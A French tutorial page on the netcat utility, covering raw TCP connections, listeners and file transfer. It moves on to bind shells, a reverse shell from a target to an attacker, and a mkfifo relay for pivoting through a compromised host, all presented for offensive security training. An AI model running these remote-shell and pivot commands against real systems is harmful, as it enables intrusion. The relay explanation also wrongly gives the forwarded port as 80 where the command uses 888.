+++
title = 'Netcat'
date = 2024-07-11T10:52:34-04:00
draft = false
weight = 15
+++

Parfois on souhaite établir une connexion avec un hôte mais sans utiliser le protocole _ssh_. L'utilitaire _netcat_ (ou `nc`) permet une assez grande flexibilité à cette fin: en effet il ne fait qu'ouvrir une connexion TCP "brute" sur l'hôte; on peut ensuite utiliser cette connexion comme on le souhaite. 

##### Ouvrir une connexion sur un port TCP distant

Pour établir une connexion TCP avec un hôte distant il s'agit de lancer `nc` suivi de l'adresse et du port de destination; ensuite ce qui est saisi sur la ligne de commande sera transmis à l'hôte distant. Ainsi pour se connecter sur un serveur HTTP on procède comme suit:

```
└─$ nc 10.30.242.10 80
```

##### Ouvrir un port local

À l'inverse, on peut vouloir recevoir une connexion étable par un hôte distant. Dans ce cas on doit ouvrir un port local avec `nc`; tous les messages envoyés par cet hôte s'afficheront sur la ligne de commande. Les options suivantes sont utilisées:
+ `-l` : Lancer _netcat_ en mode "écoute" 
+ `-p` : Spécifie le port qu'on souhaite ouvrir 

Par exemple pour ouvrir le port TCP 4433 en attente d'une connexion entrante:
```
└─$ nc -lp 4433
```

##### Connexion _client-serveur_

Deux hôtes qui exécutent _netcat_ (un en mode direct et l'autre en mode "écoute") peuvent ainsi se transmettre des informations à partir de la ligne de commande. Par exemple, si vous lancez les commandes suivantes sur deux hôtes (où 10.0.0.10 est l'adresse IP de l'hôte distant):

**Hôte distant:**
``` 
pc23:~# nc -lp 1234
```
**Hôte local:**
```
└─$ nc 10.0.0.10 1234
```
Toute ce que sera ensuite saisi sur la ligne de commande d'un hôte sera affichée sur celle de l'autre.


##### Transférer des fichiers

On peut combiner la commande `nc` avec la redirection de fichiers: par exemple, si on établit une connexion client-serveur entre deux hôtes et que, du côté serveur (celui en mode "écoute"), on redirige vers un fichier, toutes les données reçues sur le serveur seront écrites dans un fichier plutôt que de s'afficher à la ligne de commande:

**Hôte distant:**
``` 
pc23:~# nc -lp 1234 > donnees-recues.txt
```
À l'inverse, pour transférer un fichier il suffit d'utiliser l'opérateur **<** pour lire dans un fichier ce qui sera envoyé à partir du client, comme suit:

**Hôte local:**
```
└─$ nc 10.0.0.10 1234 < donnees-envoyees.txt
```

##### _Shells_ liés

Il est possible de lier à un programme exécutable les données reçues côté serveur en utilisant l'option **-e**: celles-ci seront donc redirigées vers ce programme qui pourra les utiliser. L'utilisation la plus courante de cette fonctionnalité est de lier un interpréteur de commandes, comme par exemple _bash_; ceci permet d'utiliser la connexion comme un _shell_ distant:

**Hôte distant:**
``` 
pc23:~# nc -lp 1234 -e /bin/bash
```
**Hôte local:**
```
└─$ nc 10.0.0.10 1234                                              
hostname
mod3
whoami
root
```

{{% notice tip "Attention" %}}
En raison du risque de sécurité associé à l'utilisation de l'option **-e**, la plupart des versions de _netcat_ ne permettent pas de l'utiliser (même avec _sudo_).
{{% /notice %}}

##### _Shells_ inversés

Les _shells_ inversés sont très utiles dans un contexte de sécurité offensive. En effet, souvent les hôtes "cibles" sur lesquels on cherche à se connecter sont derrière un pare-feu; il n'est donc pas possible d'ouvrir des connexions sur n'importe quel port, comme on le faisait dans les exemples précédents. Cependant, les pare-feux autorisent généralement les connexions sortantes vers n'importe quel port. Il s'agit donc d'établir une connexion liée à un _shell_ comme vu plus haut, mais dont l'origine est la cible: c'est celle-ci qui tente de se connecter vers l'attaquant.

Lorsqu'on obtient la possibilité d'exécuter des programmes sur une cible (généralement suite à l'exploitation d'une vulnérabilité), même avec des privilèges limités, il peut être possible de lancer une connexion de ce type. On inverse simplement les rôles du client et du serveur entre l'attaquant et la cible:

**Hôte distant:**
``` 
pc23:~# nc 10.10.10.10 777 -e /bin/bash
```
**Hôte local:**
```
└─$ nc -lp 777                                              
```

##### Relais

On peut aussi utiliser _netcat_ pour dissimuler l'origine des messages qu'on envoie, ou encore utiliser un hôte compromis pour rejoindre des hôtes qui ne sont pas directement accessibles. On utilise pour ce faire un "relais".

Le principe est plutôt simple: Il s'agit de lancer deux instances de _netcat_: la première écoute les données entrantes sur un port; on redirige la sortie de cette commande vers la deuxième instance de _netcat_ qui enverra ces données à la destination de notre choix.  

La commande requiert cependant d'utiliser `mkfifo` pour créer un _canal nommé_, ("named pipe"), qui est un type spécial de fichier dont l'utilité est de servir de canal de communication entre des programmes ou processus. On relie ensuite ce fichier à l'entrée (0) et à la sortie (1) standard avec les redirecteurs appropriés. 

Les commandes pour créer un relais sont les suivantes:

**Hôte ciblé**
```
victime:~# nc -lvnp 888 -e /bin/bash
``` 
**Hôte pivot/relais (10.0.0.10):**
```
relais:~# mkfifo redirect
relais:~# nc -lk -p 5000 0<redirect | nc 10.11.11.11 888 1>redirect
```
**Hôte local:**
```
└─$ nc 10.0.0.10 5000
```
Sur l'hôte distant, ce qui entre au port 5000 est redirigé vers le port 80 de **10.11.11.11**. Lorsque l'attaquant accède à **10.0.0.10:5000**, il communique en réalité avec **10.11.11.11:888**.


### Pour aller plus loin

+ https://reznok.com/netcat-tunneling-magic/
+ https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99


